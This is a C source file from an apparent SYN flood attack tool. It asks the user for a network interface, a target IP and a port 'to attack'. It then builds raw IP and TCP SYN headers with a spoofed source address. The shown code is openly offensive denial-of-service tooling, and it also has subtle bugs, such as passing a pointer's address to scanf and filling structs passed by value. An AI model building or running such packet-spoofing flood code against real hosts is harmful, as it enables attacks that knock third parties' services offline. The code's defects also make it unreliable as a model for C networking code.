#include "../includes/lib_attack.h"

unsigned short csum(unsigned short *ptr, int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum = 0;
    while (nbytes > 1) 
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) 
    {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
     
    return (answer);
}

//used for checking IP number's validity.
int isInteger(char *str)
{
    for (int i = 0; i < strlen(str); i++)
    {
	    if (isdigit(str[i]) == 0 && str[i] != '\n')
	        return 0;
    }
    return (1);
}

//checks if IP number is valid
int check_IP(char *IP)
{
    int num;
    int flag = 1;
    int counter = 0;

    char* p = strtok(IP, ".");
    
    while (p != NULL)
    {
	    if(isInteger(p))
        {
            num = atoi(p);
            if (num >= 0 && num <= 255 && counter++ < 4)
            {
		        flag = 1;
		        p = strtok(NULL, ".");
            }
	        else
            {
	 	        flag = 0;
		        break;
	        }
	    }
	    else
        {
	        flag = 0;
	        break;
	    }
    }
    return (flag && counter == 4);
}

void    accept_info(FILE *interfaceFile, char *dIP, int *destPort)
{
    char intface[20];	//To hold interface through which attack is happening.
    char pseudodIP[16];

    //Accepting interface information from the user.
    printf("Enter interface to send packets through: ");
    scanf("%s", intface);
    fprintf(interfaceFile, "%s\n", intface);
    fclose(interfaceFile);

    //Accepting destination IP address from the user.
    printf("Enter IP number to attack: ");
    fgets(dIP, 16, stdin);

    strcpy(pseudodIP,dIP);

    while (check_IP(pseudodIP) == 0)
    {
        printf("Enter a valid IP number to attack: ");
        fgets(dIP, 16, stdin);
        strcpy(pseudodIP, dIP); 
    }

    //Accepting destination port number from the user.
    printf("Enter destination port number: ");
    scanf("%d", &destPort);

    //Demonstration of destionation IP address and port number.
    printf("/******************/\nIP Number: ");
    printf("%s", dIP);
    printf("Port Number: %d\n", destPort);
}

void    fill_struct(struct sockaddr_in sin, struct iphdr *iph, struct tcphdr *tcph, 
        struct pseudo_header psh, int destPort, char *dIP, char *source_ip, char *datagram, int sourcePort)
{
    sin.sin_family = AF_INET;
    sin.sin_port = htons(destPort);
    sin.sin_addr.s_addr = inet_addr(dIP);
        
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 1;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;                          //Set to 0 before calculating checksum
    iph->saddr = inet_addr(source_ip);    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum ((unsigned short *)datagram, iph->tot_len >> 1);
        
    //TCP Header
    sourcePort = 1024 + (rand() % (65535 - 1024));
    tcph->source = htons(sourcePort);
    tcph->dest = htons(destPort);
    tcph->seq = 0;
    tcph->ack_seq = 1000;
    tcph->doff = 5;      /* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons(5840); /* maximum allowed window size */
    tcph->check = 0;             /* if you set a checksum to zero, your kernel's IP stack
                                    should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;

    //Now the IP checksum
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20); 
    
    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
    
    tcph->check = csum((unsigned short*)&psh, sizeof(struct pseudo_header));   
}